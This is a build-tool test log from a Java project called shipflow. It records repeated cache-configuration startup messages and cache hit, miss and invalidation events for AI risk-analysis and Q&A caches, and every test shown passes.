2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.009Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.009Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache miss for context: pitch_1_0_0
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.009Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.009Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.009Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.009Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.009Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.009Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_2_0_0, TTL=3 hours)
2026-01-17T23:26:49.009Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated Q&A cache for context: pitch_1
2026-01-17T23:26:49.010Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache miss for context: pitch_1_0_0
2026-01-17T23:26:49.010Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache miss for context: pitch_1_0_0
2026-01-17T23:26:49.010Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.010Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.010Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.010Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.010Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.010Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache fuzzy hit (similarity=0.88, threshold=0.85, hits=1)
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$QACacheTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$CycleRiskCacheTests
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.011Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.011Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: cycle risk 1 (withAI=true, hits=1)
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.011Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.011Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for cycle 1
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0 s -- in com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$CycleRiskCacheTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$PitchRiskCacheTests
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.012Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.012Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.013Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.013Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.013Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=false, TTL=infinite)
2026-01-17T23:26:49.013Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:49.013Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=false, hits=1)
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.014Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.014Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.014Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=false, TTL=infinite)
2026-01-17T23:26:49.014Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:49.014Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=false, hits=1)
2026-01-17T23:26:49.015Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for pitch 1
2026-01-17T23:26:49.015Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 1 (withAI=true)
2026-01-17T23:26:49.015Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 1 (withAI=false)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
